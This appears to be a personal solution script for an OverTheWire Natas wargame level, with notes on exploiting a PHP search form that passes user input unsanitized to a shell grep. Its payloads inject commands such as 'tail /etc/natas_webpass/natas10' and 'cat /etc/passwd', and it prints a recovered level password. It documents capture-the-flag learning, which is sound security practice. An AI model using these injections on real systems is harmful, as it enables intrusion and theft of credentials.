#!/usr/bin/env python
from driver import *


req=makeGetConnection(target="index-source.html")
# print unescap_thml(req.text)



# /><form> />Find words containing: 
# <input name=needle>
# <input type=submit name=submit value=Search>
# </form> /> /> 
# />Output: />

# <pre> />
# <? />$key = ""; /> />
# if(array_key_exists("needle", $_REQUEST)) { />  
#   $key = $_REQUEST["needle"]; />} /> />if($key != "") { />
#  passthru("grep -i $key dictionary.txt"); />} />?> />
#  </pre> /> />

# We got some unsanitized input handling going on


# (venv) b3twiise@phoenix:~/OTW/natas/src/natas$ needle="`ls`"
# (venv) b3twiise@phoenix:~/OTW/natas/src/natas$ grep -i $needle /usr/share/dict/words
# Binary file driver.pyc matches
# (venv) b3twiise@phoenix:~/OTW/natas/src/natas$ 

# Will this work?


data={
	# "needle" : "binousalkdjfaf; ls -la",
	"needle" : "binousalkdjfaf; tail /etc/natas_webpass/natas10",
	"submit" : True
}
req=makeGetConnection(post=True, data=data)


# (venv) b3twiise@phoenix:~/OTW/natas/src/natas$ grep -i $needle /usr/share/dict/words
# (venv) b3twiise@phoenix:~/OTW/natas/src/natas$ needle="\n`ls`"
# (venv) b3twiise@phoenix:~/OTW/natas/src/natas$ grep -i $needle /usr/share/dict/words
# (venv) b3twiise@phoenix:~/OTW/natas/src/natas$ needle="`ls`"
# (venv) b3twiise@phoenix:~/OTW/natas/src/natas$ grep -i $needle /usr/share/dict/words
# Binary file driver.pyc matches
# natas9.py:# Binary file driver.pyc matches
# (venv) b3twiise@phoenix:~/OTW/natas/src/natas$ 


# Above works on my machine but does not work with the exercise
#_____________________________________________________________

# data={
# 	# "needle" : "binousalkdjfaf; ls -la",
# 	"needle" : "beninojus; cat /etc/passwd#",
# 	"submit" : True
# }


# Reading on best practices for grep. We see that devs are worned about above command. Seeems like what we neee:Mua ha ah hah 

# data={
# 	"needle" : "binousalkdjfaf; ls -la",
# 	# "needle" : "beninojus; cat /etc/passwd#",
# 	"submit" : True
# }
# --------------------------R E S U L T----------------------------
# Output:
# <pre>
# -rw-r----- 1 natas9 natas9 460878 Dec 15  2016 dictionary.txt
# </pre>



# data={
# 	"needle" : "binousalkdjfaf; ls",
# 	# "needle" : "beninojus; cat /etc/passwd#",
# 	"submit" : True
# }
# --------------------------R E S U L T----------------------------
# Output:
# <pre>
# dictionary.txt
# </pre>




# data={
# 	# "needle" : "binousalkdjfaf; ls -la",
# 	"needle" : "binousalkdjfaf; file /etc/natas_webpass/natas9",
# 	"submit" : True
# }
# # --------------------------R E S U L T----------------------------
# Output:
# <pre>
# /etc/natas_webpass/natas9: ASCII text
# dictionary.txt:            UTF-8 Unicode text
# </pre>


#########################################################################
##$#
###SSSSSSSSHHHHHH yOU HERE THAT? ??????????????????????????????
####
###############################################################################


# Note: It is possible that at a certain point above we had the password but since we kept using cat, The ouput overwhelmed our console. We switched to tail and ba!!!

# Output:
# <pre>
# ==> /etc/natas_webpass/natas10 <==
# nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

# ==> dictionary.txt <==
# zoomed
# zooming
# zooms
# zoos
# zucchini
# zucchini's
# zucchinis
# </pre>









#This pulls it. Now let us retrieve it

passwd = retrievePassword(req)

print_and_store_password(passwd)

